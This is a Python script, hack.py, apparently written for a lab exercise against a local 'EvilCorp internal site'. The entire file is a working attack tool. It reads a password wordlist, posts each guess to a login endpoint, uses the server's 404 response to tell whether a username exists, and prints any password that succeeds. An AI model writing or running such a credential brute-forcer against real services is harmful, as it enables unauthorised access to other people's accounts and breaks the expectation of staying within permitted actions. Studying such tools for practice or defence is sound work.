import os
import sys

import requests


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    INFO = '\033[37m'


def log(msg, color=bcolors.INFO):
    print(f'{color}{msg}{bcolors.ENDC}')


def hack(username, passwords):
    for count, password in enumerate(passwords):
        data = {
            'username': username,
            'password': password
        }

        resp = requests.post(
            'http://127.0.0.1:5000/login',
            data=data,
            headers={'Content-Type': 'application/x-www-form-urlencoded'}
        )

        if resp.status_code == 404:
            log(f'Username {username} is not valid', bcolors.FAIL)
            return

        elif resp.status_code == 200:
            log(f'Password for {username} is {password}', bcolors.OKGREEN)
            return

        if count % 10 == 0:
            log(f'Tried {count} passwords')

    log(f'Could not find password for {username}', bcolors.FAIL)


def main(args):
    username = args[1]
    password_list = args[2]

    current_dir = os.getcwd()
    password_file = os.path.join(current_dir, password_list)

    try:
        with open(password_file) as password_list:
            passwords = password_list.read().split('\n')
    except FileNotFoundError:
        log(f'Could not find password list {password_file}', bcolors.FAIL)
        sys.exit(1)

    hack(username, passwords)


if __name__ == '__main__':
    if len(sys.argv) < 3:
        log('''Usage: python hack.py username password_list\n
Iterate over a list of passwords for a username to brute-force login
to the EvilCorp internal site\n
username      : Username of account to hack
password_list : Path of password list to use
''', bcolors.HEADER)
        sys.exit(0)

    main(sys.argv)
